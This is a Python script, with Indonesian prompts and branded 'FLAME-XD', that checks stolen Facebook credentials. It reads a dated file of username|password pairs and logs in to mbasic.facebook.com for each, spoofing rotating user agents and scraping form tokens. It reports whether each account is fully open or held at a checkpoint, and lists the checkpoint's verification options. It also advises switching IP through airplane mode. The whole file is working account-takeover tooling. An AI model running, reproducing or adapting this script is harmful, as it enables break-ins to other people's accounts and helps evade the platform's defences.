import random, requests, datetime, os
from rich.panel import Panel as nel
from concurrent.futures import ThreadPoolExecutor as tread
from rich import print as cetak
from bs4 import BeautifulSoup as sop
from rich.panel import Panel as panel
from rich import print as vprint
#from random import randint

######### WARNA RICH BIASA #########

P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
H = "\x1b[0;92m" # Hijau
K = "\x1b[0;93m" # Kuning
B = "\x1b[0;94m" # Biru
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # Biru Muda
N = "\033[0m"    # Warna Mati
o = '\033[1;36m'

########## WARNA RICH CERAH ###########

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
M3 = "#FF0000" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "#00FF00" # HIJAU
K2 = "[#FFFF00]" # KUNING
K3 = "#FFFF00" # KUNING
B2 = "[#00C8FF]" # BIRU
B3 = "#00C8FF" # BIRU
U2 = "[#AF00FF]" # UNGU
U3 = "#AF00FF" # UNGU
N2 = "[#FF00FF]" # PINK
N3 = "#FF00FF" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
O3 = "#00FFFF" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
P3 = "#FFFFFF" # PUTIH
J2 = "[#FF8F00]" # JINGGA
J3 = "#FF8F00" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

########### BAHAN RANDOM #############

warna_simbol=random.choice([H,K,M,O,B,U])
warna_warni_rich=random.choice([J3,K3,H3,P3,O3,N3,U3,B3,M3])
pelangi_cerah=random.choice([J3,K3,H3,O3,N3,U3,B3])
flame_poke = f" {P}[{warna_simbol}÷{P}]"

############ BAHAN TAMBAHAN ###########

ses=requests.Session()
FR = {'1':'januari','2':'februari','3':'maret','4':'april','5':'mei','6':'juni','7':'juli','8':'agustus','9':'september','10':'oktober','11':'november','12':'desember'}
tgl = datetime.datetime.now().day
bln = FR[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)
cpz = "CP-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
host = "https://mbasic.facebook.com"

############# BERTANDA PENGENAL ############

tutor = "FLAME-XD"
nama = input("isi nama anda sesuai pemberian emak ")
os.system("clear")

############ SEDIKIT CATATAN ############
def peringatan():
	cetak(panel("""   _                                   _____                 _
  | |    ___   __ _  __ _  ___ _ __   |_   _|_ _ _ __       / |
  | |   / _ \ / _` |/ _` |/ _ \ '__|    | |/ _` | '_ \ _____| |
  | |__| (_) | (_| | (_| |  __/ |       | | (_| | |_) |_____| |
  |_____\___/ \__, |\__, |\___|_|       |_|\__,_| .__/      |_|
              |___/ |___/                       |_|
"""))
	print("\x1b[1;97m     selamat datang\x1b[1;92m",nama,"\x1b[1;97manda memakai tools\x1b[1;93m",tutor,"\x1b[1;97mgood luck")
	poke=f"  {P2}ini adalah cek opsi berlogger flame, jadi anda harus waspada><\n\n    {K2}peringatan untuk nama file cp seperti contoh ini dibawah"
	vprint(panel(poke, style=f"{pelangi_cerah}"))
	nice=f"{P2}                example : {cpz} \n           untuk pemisah akun hanya {H2}| {P2}only, good luck"
	vprint(panel(nice, style=f"{pelangi_cerah}"))
	input(f"{flame_poke} enter untuk melanjutkan ")
	check_opsi_sesudah_crack()
def check_opsi_sesudah_crack():
	x=f"  {P2}sebelum mengecek alangkah baiknya mode pesawat 5 detik ip fresh"
	vprint(panel(x,style=f"{pelangi_cerah}"))
	input(f"{flame_poke} enter untuk melanjutkan ")
	files = (f"{cpz}")
	try:
		flame = open(files, "r").readlines()
	except IOError:
		exit("\n%s files %s%s%s tidak ada!"%(flame_poke,H,files,P))
	for jojo in flame:
		flamexd = jojo.replace("\n","")
		plem  = flamexd.split("|")
		print(f"\n{flame_poke} account : "+(flamexd.replace(" + ","")))
		try:
			bapakmu_flame(plem[0].replace(" + ",""), plem[1])
		except requests.exceptions.ConnectionError:
			pass
	#os.remove(f"CP/{cpz}")
	input(f"{flame_poke}enter untuk kembali ")
	exit("%s done ya cuy"%(flame_poke))

def bapakmu_flame(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	ses.headers.update({
	"Host": "mbasic.facebook.com",
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": host,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": ua,
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"x-requested-with": "mark.via.gp",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": host+"/login/?next&ref=dbl&fl&refid=8",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
	})
	data = {}
	ged = sop(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	try:
		run = sop(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	except requests.exceptions.TooManyRedirects:
		print("%s %sakun ke spam "%(flame_poke,M))
	if "c_user" in ses.cookies:
		print("%s %sakun OK tidak checkpoint"%(flame_poke,H))
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"jazoest": jzst,
			"jazoest": jzst,
			"checkpoint_data":"",
			"submit[Continue]":"Lanjutkan",
			"nh": nh
		}
		xnxx = sop(ses.post(host+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if(str(len(ngew))=="0"):
			print("%s %sAccount One Tap Segera Check Di Facebook lite or Mbasic"%(flame_poke,H))
		else:
			print("%s %sterdapat %s opsi %s"%(flame_poke,K,str(len(ngew)),H))
		for opt in range(len(ngew)):
			print(" " *3,str(opt+1)+"\x1b[0;97m > "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" %s[%sX%s] %s%s"%(M,P,M,P,oh))
	else:
		print("%s %spassword akun telah diganti!!"%(flame_poke,M))


############# PENYELESAIAN #############

peringatan()
